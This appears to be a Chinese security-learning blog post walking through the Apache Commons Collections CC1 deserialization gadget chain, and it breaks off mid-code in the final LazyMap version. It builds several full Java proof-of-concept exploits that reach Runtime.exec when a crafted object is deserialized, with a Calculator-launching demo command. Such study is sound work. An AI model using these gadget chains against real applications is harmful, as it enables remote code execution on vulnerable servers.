# CommonsCollections1利用链学习


<!--more-->





>Apache Commons是对JDK的拓展，包含了很多开源的工具，用于解决平时编程可能遇到的问题。其中有个组件叫Apache Commons Collections，封装了Java的Collection相关类对象

CC链的利用就是以Apache Commons Collections作为链条的核心，来构造一个最终能够进行rce的gadget



### 环境搭建

先创建一个新的maven项目，然后准备好Commons Collections的依赖

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

```





1.jdk 版本这里，要求的是 jdk8u65 的，如果我们用 jdk8u71 这种，CC 链的漏洞就被修掉了，用不了

jdk不要大于8u65(下载链接https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)

或者使用zulu的



2.创建完成之后，选中 Project Structure，修改 Modules，SDKs



3.再添加 Maven 中，对 CC1 链的依赖包。

cc依赖也不要高于3.2.1

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
```

![image-20231123091452681](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123091452681.png)



4.修改 sun 包:

因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件。

去这里(https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)左侧的zip下载源码，解压src.zip，里面的share/sun包源码拷贝到本机jdk的src目录下



5.然后再IDEA的Project Structure中的下面的SDKs加上上面jdk的目录

就可以正常调试了





maven的源码，在右上角download source

### 核心demo

```java
package org.example2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CCC1 {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),

        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}

```





#### TransformedMap

TransformedMap用于对java标准数据结构Map做一个修饰，**被修饰过的Map在添加新的元素时候，执行一个“回调”**。我们通过下面代码对innerMap进行修饰，传出的outerMap就是修饰后的Map：

```java
Map outerMap =  TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);

```

![image-20231122200134250](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231122200134250.png)

对于进入map的新元素(key,value)，会利用keyTransformer对key进行处理，并且利用valueTransformer对value进行处理，当keyTransformer或者valueTransformer被设置为null时，代表不进行处理

![image-20231122200458307](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231122200458307.png)

这里所谓的“处理”，就是调用Transformer对象里面的相应方法(transform方法)来进行解析





#### Transformer

Transformer本身是一个接口，它只有一个待实现的方法。

TransformedMap在转换Map的新元素的时候，就会调用Transformer对象的transform方法，这个过程就类似在调用一个“回调函数”。

那么，既然Transformer只是一个借口，必然要有实现该接口的类，这些类就很多了，包括下面用到的三个ConstantTransformer，InvokeTransformer，ChainedTransformer。





#### ConstantTransformer

ConstantTransformer是实现了Transformer接口的一个类。代码如下：

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;

import org.apache.commons.collections.Transformer;


public class ConstantTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = 6374440726369055124L;
    
    public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);

    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        if (constantToReturn == null) {
            return NULL_INSTANCE;
        }
        return new ConstantTransformer(constantToReturn);
    }
    
 
    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;
    }


    public Object getConstant() {
        return iConstant;
    }

}

```

它的过程就是在构造函数的时候**传入一个对象，并在transform将这个对象再返回**（传进去的啥，原封不动将这个对象再返回）





#### InvokeTransformer

也是ConstantTransformer是实现了Transformer接口的一个类

```java
   //...省略前面 
	private InvokerTransformer(String methodName) {
        super();
        iMethodName = methodName;
        iParamTypes = null;
        iArgs = null;
    }


    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

这个类可以用来执行任意方法，这也是反序列化能指定任意代码的关键。

在实例化这个InvokerTransformer时候，需要传入三个参数，**第一个参数是待执行的方法，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。**



重点理解这个类的transform方法：

```java
Class cls = input.getClass();		//通过反射获取类所属的对象
Method method = cls.getMethod(iMethodName, iParamTypes);	//通过反射获取该类的指定方法
return method.invoke(input, iArgs);		//通过反射执行对象的指定方法，并支持提供参数
```

所以，这个过程中，其实就是可以**执行任意类的任意方法**了(--->任意代码执行)



那么前面demo中的也就可以理解了：

```java
new InvokerTransformer("exec",
         new Class[]{String.class},
         new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
```









#### ChainedTransformer

ChainedTransformer也是实现了Transformer接口的一个类，它的代码：

```java
public ChainedTransformer(Transformer[] transformers) {
  super();
  iTransformers = transformers;
}

public Object transform(Object object) {
  for (int i = 0; i < iTransformers.length; i++) {
    object = iTransformers[i].transform(object);
  }
  return object;
}
```

可以看到，初始化得到一个Transformer的数组，然后通过循环调用的方式对里面的Transformer都执行调用transform方法一遍，并且每个Transformer的输入是上一个Transformer执行了transform方法的结果。



简单来讲，就是**实现了链式调用**。

![image-20231122203101132](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231122203101132.png)





#### 理解demo

```java
Transformer[] transformers = new Transformer[]{ 
  				new ConstantTransformer(Runtime.getRuntime()),
          new InvokerTransformer("exec",
                     new Class[]{String.class},
                     new Object[{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),};

Transformer transformerChain = new ChainedTransformer(transformers);


```

创建了一个ChainedTransformer，它是一个链式调用，当被调用的时候，会按顺序执行里面的两个Transformer：

第一个是ConstantTransformer，可以用来返回一个Runtime对象，这个的输出丢给后面的InvokerTransformer作为输入；

第二个是InvokerTransformer，可以用来执行Runtime对象的exec方法，并且传入了打开计算器命令的参数。

相当于：`Runtime.getRuntime().exec("执行命令")`



然后，我们只是注册了一个transformers，还没有调用。

我们要将这个Transformer绑定到一个TransformedMap，并且当这个Map被添加新元素的时候，Transformer才会被调用，即：

```java
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
outerMap.put("test", "xxxx");


```







### 继续构造gadget

注意jdk版本，据说这个最高打到8u71。



我们前面已经知道Common Collections这个包中有几个类可以用来构造rce，并且在自己的代码中通过执行`outerMap.put("test", "xxxx");`实现了rce利用。

但是，**在真实场景中，并没有人帮我们执行这个函数。所以我们现在要开始寻找，有没有哪个类，在它的readObject逻辑中会触发这个动作（给Map新增元素）。**

这个类就是`sun.reflect.annotation.AnnotationInvocationHandler`，这是一个java的原生类





不建议直接看反编译的.class代码，可以github打开jdk代码**，然后在gihub后面添加`1s`打开vscode提供的在线编辑器**

Github1s.com

https://github.com/openjdk/jdk

![image-20231123100231300](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123100231300.png)

https://github1s.com/openjdk/jdk/tree/jdk8-b40

![image-20231123100428531](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123100428531.png)





**可以简单看一下readObject，看构造方法，看属性：**

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  
                Object value = memberValue.getValue();  
                if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy)) {
                    memberValue.setValue(    // memberValue.put()
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

将memberValue转换为一个set，然后再迭代一下就又取出了一个Map叫做memberValue。**我们只要将这个memberValue设置为我们的一个TransformedMap对象，然后当它在后面执行memberValue.setValue时，就会触发我们注册的Transformer，进而执行我们为其精心准备的代码。**







#### 内部类的调用



想调用`AnnotationInvocationHandler`的时候无法直接new调用，因为这个一个内部类，导致我们无法直接访问，所以使用反射。

```java
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
declaredConstructor.setAccessible(true);
Object obj = declaredConstructor.newInstance(Retention.class, outerMap);  //transformerMap

```









#### 第一个poc demo

```java
package org.example2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CCC1 {
    public static void main(String[] args) throws Exception {
        byte[] evilData = serialize(cc1("/System/Applications/Calculator.app/Contents/MacOS/Calculator"));
        unserialize(evilData);
    }

    static Object cc1(String args) throws Exception{
        Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[] {args}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj =  declaredConstructor.newInstance(Target.class, outerMap);  //transformerMap
        return obj;
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(bout);
        objOut.writeObject(obj);
        return bout.toByteArray();
    }
    public static Object unserialize(final byte[] seria) throws Exception{
        ByteArrayInputStream btin = new ByteArrayInputStream(seria);
        ObjectInputStream ois = new ObjectInputStream(btin);
        return ois.readObject();
    }
}

```





还没到反序列化，直接在序列化这一步就直接报错了：因为`java.lang.Runtime`无法序列化

![image-20231123101302830](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123101302830.png)



我们继续优化...

#### 第二个poc demo

因为`java.lang.Runtime`无法序列化

Java中并不是所有对应都支持序列化，待序列化的对象和所有它使用的内部属性对象，都必须实现了`java.io.Serializable`接口。而我们最早传给`ConstantTransformer`的是`Runtime.getRuntime()`,`Runtime`类是没有实现`java.io.Serializable`接口的，所以不允许被序列化。



解决方法：继续使用反射实现。

我们先写一个反射来执行命令的方式：

```java
Method f = Runtime.class.getMethod("getRuntime");
Runtime r = (Runtime) f.invoke(null);
r.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");

```

再写一个新的transformer链：

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),    //Runtime.class的类型是class
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{args})
        };

```

先通过`Runtime.class`构造出一个Runtime对象（对象类型为`class`），然后执行该对象的`getMethod`方法，参数是`getRuntime`,这样就会得到一个反射的Method对象。然后执行这个Runtime对象的`invoke`方法，这样就会在**运行时**得到一个`java.lang.Runtime`对象（编译时没有），最终执行exec方法，参数就是rce要执行的命令。



我们构造出一个新的poc：

```java
package org.example2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CCC1 {
    public static void main(String[] args) throws Exception {
        byte[] evilData = serialize(cc1("/System/Applications/Calculator.app/Contents/MacOS/Calculator"));
        unserialize(evilData);
    }

    static Object cc1(String args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),    //Runtime.class的类型是class
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{args})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //开始新的
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj = declaredConstructor.newInstance(Retention.class, outerMap);  // 创建一个AnnotationInvocationHandler对象
        return obj;
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(bout);
        objOut.writeObject(obj);
        return bout.toByteArray();
    }
    public static Object unserialize(final byte[] seria) throws Exception{
        ByteArrayInputStream btin = new ByteArrayInputStream(seria);
        ObjectInputStream ois = new ObjectInputStream(btin);
        return ois.readObject();
    }
}

```

现在序列化部分已经可以了，这部分不报错了了。

但是还是不行，不弹计算器，为什么？



我们调试一下。

首先明确：

```java
type = Retention.class
memberValue = 我们已经构造好的transformer的Map
```

我们的目的是触发对Map的写入操作，所以我们目标是触发`memberValue.setValue`这条逻辑。

**所以此时，如果memberValues是一个空的map，那么这个for的遍历就不会执行，所以我们需要预先给Map进行值的插入。**

```java
//首先保证Map不为空，才能进入for循环才能 memberValues.entrySet()
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {

```



![image-20231123105409570](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123105409570.png)

**但是要插入什么内容呢？**

```java
String name = memberValue.getKey(); //Map可控，所以key可控
Class<?> memberType = memberTypes.get(name);
if (memberType != null) {   //要求在memberType中也有这个key
......
}
}

```

所以去了解memberType怎么来的

```java
AnnotationType annotationType = null;
try {
  annotationType = AnnotationType.getInstance(type);
} catch(IllegalArgumentException e) {
  // Class is no longer an annotation type; time to punch out
  throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
}
```

```java
/*
 * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.
 * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.
 *
 * This code is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License version 2 only, as
 * published by the Free Software Foundation.  Oracle designates this
 * particular file as subject to the "Classpath" exception as provided
 * by Oracle in the LICENSE file that accompanied this code.
 *
 * This code is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
 * version 2 for more details (a copy is included in the LICENSE file that
 * accompanied this code).
 *
 * You should have received a copy of the GNU General Public License version
 * 2 along with this work; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 * Please contact Oracle, 500 Oracle Parkway, Redwood Shores, CA 94065 USA
 * or visit www.oracle.com if you need additional information or have any
 * questions.
 */

package sun.reflect.annotation;

import sun.misc.JavaLangAccess;

import java.lang.annotation.*;
import java.lang.reflect.*;
import java.util.*;
import java.security.AccessController;
import java.security.PrivilegedAction;

/**
 * Represents an annotation type at run time.  Used to type-check annotations
 * and apply member defaults.
 *
 * @author  Josh Bloch
 * @since   1.5
 */
public class AnnotationType {
    /**
     * Member name -> type mapping. Note that primitive types
     * are represented by the class objects for the corresponding wrapper
     * types.  This matches the return value that must be used for a
     * dynamic proxy, allowing for a simple isInstance test.
     */
    private final Map<String, Class<?>> memberTypes;

    /**
     * Member name -> default value mapping.
     */
    private final Map<String, Object> memberDefaults;

    /**
     * Member name -> Method object mapping. This (and its assoicated
     * accessor) are used only to generate AnnotationTypeMismatchExceptions.
     */
    private final Map<String, Method> members;

    /**
     * The retention policy for this annotation type.
     */
    private final RetentionPolicy retention;

    /**
     * Whether this annotation type is inherited.
     */
    private final boolean inherited;

    /**
     * Returns an AnnotationType instance for the specified annotation type.
     *
     * @throw IllegalArgumentException if the specified class object for
     *     does not represent a valid annotation type
     */
    public static AnnotationType getInstance(
        Class<? extends Annotation> annotationClass)
    {
        JavaLangAccess jla = sun.misc.SharedSecrets.getJavaLangAccess();
        AnnotationType result = jla.getAnnotationType(annotationClass); // volatile read
        if (result == null) {
            result = new AnnotationType(annotationClass);
            // try to CAS the AnnotationType: null -> result
            if (!jla.casAnnotationType(annotationClass, null, result)) {
                // somebody was quicker -> read it's result
                result = jla.getAnnotationType(annotationClass);
                assert result != null;
            }
        }

        return result;
    }

    /**
     * Sole constructor.
     *
     * @param annotationClass the class object for the annotation type
     * @throw IllegalArgumentException if the specified class object for
     *     does not represent a valid annotation type
     */
    private AnnotationType(final Class<? extends Annotation> annotationClass) {
        if (!annotationClass.isAnnotation())
            throw new IllegalArgumentException("Not an annotation type");

        Method[] methods =
            AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
                public Method[] run() {
                    // Initialize memberTypes and defaultValues
                    return annotationClass.getDeclaredMethods();
                }
            });

        memberTypes = new HashMap<String,Class<?>>(methods.length+1, 1.0f);
        memberDefaults = new HashMap<String, Object>(0);
        members = new HashMap<String, Method>(methods.length+1, 1.0f);

        for (Method method :  methods) {
            if (method.getParameterTypes().length != 0)
                throw new IllegalArgumentException(method + " has params");
            String name = method.getName();
            Class<?> type = method.getReturnType();
            memberTypes.put(name, invocationHandlerReturnType(type));
            members.put(name, method);

            Object defaultValue = method.getDefaultValue();
            if (defaultValue != null)
                memberDefaults.put(name, defaultValue);
        }

        // Initialize retention, & inherited fields.  Special treatment
        // of the corresponding annotation types breaks infinite recursion.
        if (annotationClass != Retention.class &&
            annotationClass != Inherited.class) {
            JavaLangAccess jla = sun.misc.SharedSecrets.getJavaLangAccess();
            Map<Class<? extends Annotation>, Annotation> metaAnnotations =
                AnnotationParser.parseSelectAnnotations(
                    jla.getRawClassAnnotations(annotationClass),
                    jla.getConstantPool(annotationClass),
                    annotationClass,
                    Retention.class, Inherited.class
                );
            Retention ret = (Retention) metaAnnotations.get(Retention.class);
            retention = (ret == null ? RetentionPolicy.CLASS : ret.value());
            inherited = metaAnnotations.containsKey(Inherited.class);
        }
        else {
            retention = RetentionPolicy.RUNTIME;
            inherited = false;
        }
    }

    /**
     * Returns the type that must be returned by the invocation handler
     * of a dynamic proxy in order to have the dynamic proxy return
     * the specified type (which is assumed to be a legal member type
     * for an annotation).
     */
    public static Class<?> invocationHandlerReturnType(Class<?> type) {
        // Translate primitives to wrappers
        if (type == byte.class)
            return Byte.class;
        if (type == char.class)
            return Character.class;
        if (type == double.class)
            return Double.class;
        if (type == float.class)
            return Float.class;
        if (type == int.class)
            return Integer.class;
        if (type == long.class)
            return Long.class;
        if (type == short.class)
            return Short.class;
        if (type == boolean.class)
            return Boolean.class;

        // Otherwise, just return declared type
        return type;
    }

    /**
     * Returns member types for this annotation type
     * (member name -> type mapping).
     */
    public Map<String, Class<?>> memberTypes() {
        return memberTypes;
    }

    /**
     * Returns members of this annotation type
     * (member name -> associated Method object mapping).
     */
    public Map<String, Method> members() {
        return members;
    }

    /**
     * Returns the default values for this annotation type
     * (Member name -> default value mapping).
     */
    public Map<String, Object> memberDefaults() {
        return memberDefaults;
    }

    /**
     * Returns the retention policy for this annotation type.
     */
    public RetentionPolicy retention() {
        return retention;
    }

    /**
     * Returns true if this this annotation type is inherited.
     */
    public boolean isInherited() {
        return inherited;
    }

    /**
     * For debugging.
     */
    public String toString() {
        return "Annotation Type:\n" +
               "   Member types: " + memberTypes + "\n" +
               "   Member defaults: " + memberDefaults + "\n" +
               "   Retention policy: " + retention + "\n" +
               "   Inherited: " + inherited;
    }
}

```

注意到这里面有一句

```java
annotationClass.isAnnotation()
```

就是检查输入的参数，是不是一个注解类，如果不是就会报错。

**所以这里要求第一个参数必须是一个注解类**

然后

```java
Method[] methods =
  AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
    public Method[] run() {
      // Initialize memberTypes and defaultValues
      return annotationClass.getDeclaredMethods();
    }
  });

memberTypes = new HashMap<String,Class<?>>(methods.length+1, 1.0f);
memberDefaults = new HashMap<String, Object>(0);
members = new HashMap<String, Method>(methods.length+1, 1.0f);

for (Method method :  methods) {
  if (method.getParameterTypes().length != 0)
    throw new IllegalArgumentException(method + " has params");
  String name = method.getName();
  Class<?> type = method.getReturnType();
  memberTypes.put(name, invocationHandlerReturnType(type));
  members.put(name, method);
```

**这里通过反射方式，获取这个注解类的所有方法**

**然后再将所有的方法名塞给memberTypes这个Map**

而我们这里要获取的就是memberType

```java
public Map<String, Class<?>> memberTypes() {
  return memberTypes;
}

```

所以我们的需求就变成了：

对于`sun.reflect.annotation.AnnotationInvocationHandler`这个类的构造函数

```java
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
```

而言，我们需要找到一个参数type，它必须满足：

1. 是一个类对象
2. 该类是一个注解类
3. **该类至少存在一个方法**（记为Methodxxx）

然后我们控制memberValues，让他满足：

1. 存在一个键值对，**其key等于**Methodxxx

最终我们找到了一个*Retention*类



![image-20231123111335349](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123111335349.png)

#### 第三个poc demo

```java
package org.example2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CCC1 {
    public static void main(String[] args) throws Exception {
        byte[] evilData = serialize(cc1("/System/Applications/Calculator.app/Contents/MacOS/Calculator"));
        unserialize(evilData);
    }

    static Object cc1(String args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),    //Runtime.class的类型是class
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{args})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
//        transformerChain.transform(Runtime.class);  //只需要调用一次transform

        Map innerMap = new HashMap();
        innerMap.put("value", "xxx");  //给map加了一个值,Retention类的方法是value方法。如果value改成别的就不会弹计算器了
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //开始新的
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj = declaredConstructor.newInstance(Retention.class, outerMap);  // 创建一个AnnotationInvocationHandler对象
        return obj;
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(bout);
        objOut.writeObject(obj);
        return bout.toByteArray();
    }
    public static Object unserialize(final byte[] seria) throws Exception{
        ByteArrayInputStream btin = new ByteArrayInputStream(seria);
        ObjectInputStream ois = new ObjectInputStream(btin);
        return ois.readObject();
    }
}

```



其他符合条件的注解类还很多，比如Target等。

现在这版本的poc是可以弹计算器的









#### 第四个poc demo

但是，以上的demo还是有问题的，因为他不是ysoserial里面的cc1链，所以我们再来看看真正的cc1链长什么样。

我们用到的核心类是`TransformedMap`(参考的p牛的),而cc1用到的是`LazyMap`

我们的调用链：

```java
AnnotationInvocationHandler.readObject()
  	memberValue.setValue()
  		TransformedMap.put()
  			TransformedMap.transform()
  			-->ChainedTransformer导致的rce
```

cc1使用LazyMap的调用链：

```java
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()   //从这里往回找哪里用了transform方法
							ChainedTransformer.transform()   //什么时候会触发get呢？在AnnotationInvocationHandler的invoke
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
```



> 原因：前面这个POC只有在Java 8u71以前的版本中才能执行成功，Java 8u71以后的版本由于sun.reflect.annotation.AnnotationInvocationHandler发⽣了变化导致不再可⽤；
> 在ysoserial的代码中，没有⽤到上面POC的TransformedMap，而是改用了了LazyMap。

LazyMap也来自于Common Collections库，并继承AbstractMapDecorator类。
LazyMap的漏洞触发点和TransformedMap唯一的**差别**是：**TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的factory.transform** 。
当在get找不到值的时候，它会调用factory.transform方法这个动作

![image-20231123113615876](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123113615876.png)

那么现在有一个问题，因为在在AnnotationInvocationHandler这个类的readObject里面有一个put的动作，所以能够触发。但是我们现在改用LazyMap，那么需要的就是一个get的动作，但是readObject里面没有，那么怎么办？

发现在invoke里面有个get的：

![image-20231123113837430](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123113837430.png)



那么我们如何从readObject跳到invoke？ysoserial的作者想到的是**利用java代理对象**







##### java对象代理

java中，如果我们调用了别人的sdk，又觉得别人sdk里面某个代码写的不好，java不建议直接修改sdk代码，而是提供了一种叫做代理的设计模式（感觉类似hook）

总而言之，我们可以创建一个代理类来hook另一个类里面的方法。经常被人用来做破解



参考链接：

https://blog.csdn.net/qq_51274606/article/details/123440137





##### AnntationInvocationHandler利用

当动态代理类的代理对象调用任意方法的时候，就会进入到这个实现了InvocationHandler接口的类中的`invoke()`方法。

我们回看 `sun.reflect.annotation.AnnotationInvocationHandler` ，会发现实际上这个类就是实现了InvocationHandler接口（AnnotationInvocationHandler本身就是一个InvocationHandler类），因此能够用作动态代理。

我们如果将这个对象用Proxy进行代理，那么在`readObject()`的时候，只要调用任意方法，就会进入到 `AnnotationInvocationHandler#invoke` 方法中，进而触发我们的 `LazyMap#get` 



那么，如果我们用AnnotationInvocationHandler去代理LazyMap呢？

```java
//AnnotationInvocationHandler代理了map
A = new AnnotationInvocationHandler();
//中间有一步注册的操作
A.setValue() ===> A.invoke ===> A.memberValues.get()  ===> LazyMap.get()
```



最终POC：

```java
package org.example2;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CCC1 {
    public static void main(String[] args) throws Exception {
        byte[] evilData = serialize(cc1("/System/Applications/Calculator.app/Contents/MacOS/Calculator"));
        unserialize(evilData);
    }

    static Object cc1(String args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),    //Runtime.class的类型是class
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{args})
        };

